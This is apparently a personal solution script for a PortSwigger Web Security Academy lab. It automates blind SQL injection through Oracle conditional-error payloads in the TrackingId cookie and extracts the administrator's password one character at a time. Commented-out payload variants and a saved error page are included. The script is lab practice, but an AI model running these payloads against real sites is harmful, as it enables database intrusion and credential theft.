import { parse } from "node-html-parser";
import axios from "axios";
import * as fs from "fs";

const subDomain = "ac701fea1e04a2adc026487900cb009b";
const fullWebAddress = `https://${subDomain}.web-security-academy.net/`;
const queryPrefix = `filter?category=Gifts`;

const main = async () => {
  // [\\]^_{|}~!"#$&:<=>?@\()*+,-./
  const alphabet = `0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz`;
  let extractedPassword = "";
  let currentCharacterIndex = 0;
  let currentPasswordIndex = 1;
  while (true) {
    try {
      // console.log(
      //   `TrackingId=7GIN8M7m5eSOW7I5' AND (SELECT CASE WHEN (Username = 'administrator' AND SUBSTRING(Password, ${currentPasswordIndex}, 1) = '${alphabet[currentCharacterIndex]}') THEN 1/0 ELSE 'a' END FROM Users)='a`
      // );
      // console.log(extractedPassword);
      const response = await axios.get(fullWebAddress, {
        headers: {
          // Cookie: `TrackingId=7GIN8M7m5eSOW7I5' AND (SELECT CASE WHEN (Username = 'administrator' AND SUBSTRING(Password, ${currentPasswordIndex}, 1) = '${alphabet[currentCharacterIndex]}') THEN 1/0 ELSE 'a' END FROM Users)='a`,
          // Cookie: `TrackingId=7GIN8M7m5eSOW7I5' AND (SELECT CASE WHEN (Username = 'administrator' AND SUBSTRING(Password, ${currentPasswordIndex}, 1) = '${alphabet[currentCharacterIndex]}') THEN to_char(1/0) ELSE 'a' END FROM Users)='a`,
          // Cookie: `TrackingId=7GIN8M7m5eSOW7I5' AND (SELECT username, password CASE WHEN (username = 'administrator' AND SUBSTR(password, ${currentPasswordIndex}, 1) = '${alphabet[currentCharacterIndex]}') THEN to_char(1/0) ELSE 'a' END FROM Users)='a`,
          Cookie: `TrackingId=7GIN8M7m5eSOW7I5'||(SELECT CASE WHEN (SUBSTR(password, ${currentPasswordIndex}, 1) = '${alphabet[currentCharacterIndex]}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`,
        },
      });

      // console.log(response);

      // await sleep(1000);

      // console.log(currentPasswordIndex);
      // if (response.data.includes("Welcome")) {
      // console.log(alphabet[currentCharacterIndex]);
      // // console.log(response);
      // extractedPassword += alphabet[currentCharacterIndex];
      // currentCharacterIndex = 0;
      // currentPasswordIndex += 1;
      // } else if (currentCharacterIndex === 92) {
      // break;
      // } else {
      console.log("SUCCESS");
      if (currentCharacterIndex === 92) {
        break;
      }
      currentCharacterIndex += 1;

      // }
    } catch (e) {
      console.log("NEW LETTER!: ", alphabet[currentCharacterIndex]);
      extractedPassword += alphabet[currentCharacterIndex];
      currentPasswordIndex += 1;
      currentCharacterIndex = 0;
      // if (
      //   e.response.status !== 500 ||
      //   e.response.statusText !== "Internal Server Error"
      // ) {
      //   console.log(alphabet[currentCharacterIndex]);
      // }
      // console.log(e.statusText);

      // console.log(response);

      // currentCharacterIndex += 1;

      // console.log("error");
    }
  }
  console.log(extractedPassword);
};

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

const normalErrorResponse = `<!DOCTYPE html>
<html>
<head>
    <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
    <link href=/resources/css/labs.css rel=stylesheet>
    <title>&#66;&#108;&#105;&#110;&#100;&#32;&#83;&#81;&#76;&#32;&#105;&#110;&#106;&#101;&#99;&#116;&#105;&#111;&#110;&#32;&#119;&#105;&#116;&#104;&#32;&#99;&#111;&#110;&#100;&#105;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#101;&#114;&#114;&#111;&#114;&#115;</title>
</head>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
<section class='academyLabBanner'>
    <div class=container>
        <div class=logo></div>
            <div class=title-container>
                <h2>Blind SQL injection with conditional errors</h2>
                <a class=link-back href='https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors'>
                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                        <g>
                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                        </g>
                    </svg>
                </a>
            </div>
            <div class='widgetcontainer-lab-status is-notsolved'>
                <span>LAB</span>
                <p>Not solved</p>
                <span class=lab-status-icon></span>
            </div>
        </div>
    </div>
</section>
</div>
    <div theme="">
        <section class="maincontainer">
            <div class="container">
                <header class="navigation-header">
                </header>
                <h4>Internal Server Error</h4>
                <p class=is-warning>Internal Server Error</p>
            </div>
        </section>
    </div>
</body>
</html>`;

main();
